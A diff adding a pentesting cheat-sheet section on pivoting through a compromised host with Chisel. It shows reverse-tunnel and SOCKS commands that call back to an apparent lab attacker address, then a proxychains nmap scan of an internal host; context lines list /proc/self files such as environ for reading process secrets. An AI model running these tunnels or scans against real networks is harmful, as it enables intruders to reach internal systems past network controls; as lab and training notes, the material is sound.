@@ -120,3 +120,77 @@ for i in range(65535):
     * /proc/self/cmdline - Command line
     * /proc/self/environ - Environment variables
     * /proc/self/stat - Information of the process, PID, Parrent PID
+
+## Create Tunnel with Chisel
+
+Useful when you have a reverse shell and want to tunnel some traffic without a SSH connection.
+
+Download [Chisel](https://github.com/jpillora/chisel).
+
+### Create a tunnel
+
+Create the reverse server in your machine on port 3477.
+
+```bash
+$ ./chisel server -p 3477 --reverse
+022/09/09 09:35:29 server: Reverse tunnelling enabled
+2022/09/09 09:35:29 server: Fingerprint dzD/Qptfc30MSxvgsDGogRBXv2AcwIQJD2C2S/tsmRM=
+2022/09/09 09:35:29 server: Listening on http://0.0.0.0:3477
+```
+
+Launched the client in the target machine. This connect to the server on port 3477 and create a tunnel. Any traffic on port 2222 on your machine will be tunneled to the target machine and send to 172.19.0.1 on port 80.
+
+```bash
+$ ./chisel client 10.10.14.143:3477 R:2222:172.19.0.1:80/tcp
+2022/09/09 13:39:57 client: Connecting to ws://10.10.14.143:3477
+2022/09/09 13:39:57 client: Connected (Latency 25.96244ms)
+```
+
+Open your browser on http://localhost:2222/ and you will see the site on 172.19.0.1:80.
+
+### Dynamic tunneling
+
+Create the server on your machine.
+
+```bash
+$ ./chisel server -p 9312 --reverse 
+2022/09/09 10:28:25 server: Reverse tunnelling enabled
+2022/09/09 10:28:25 server: Fingerprint fW9TjgADygUXnU2VPbt6aR3Tq0njW7wTa9/MpN8acm0=
+2022/09/09 10:28:25 server: Listening on http://0.0.0.0:9312
+```
+
+Lauch the client on the target machine, creating a reverse socks tunnel
+
+```bash
+$ ./chisel client 10.10.14.143:9312 R:socks
+2022/09/09 14:29:49 client: Connecting to ws://10.10.14.143:9312
+2022/09/09 14:29:49 client: Connected (Latency 25.930019ms)
+```
+
+You should get a connection on your server.
+
+```bash
+2022/09/09 10:29:48 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+```
+
+Configure proxychains to for socks5 on port 1080.
+
+> /etc/proxychains4.conf
+```
+socks5  127.0.0.1 1080
+```
+
+Use proxychains to run commands on the target from your machine.
+
+```bash
+$ proxychains nmap 172.19.0.1 2>/dev/null
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-09 10:33 EDT
+Nmap scan report for  (172.19.0.1)
+Host is up (0.078s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 79.48 seconds
+```
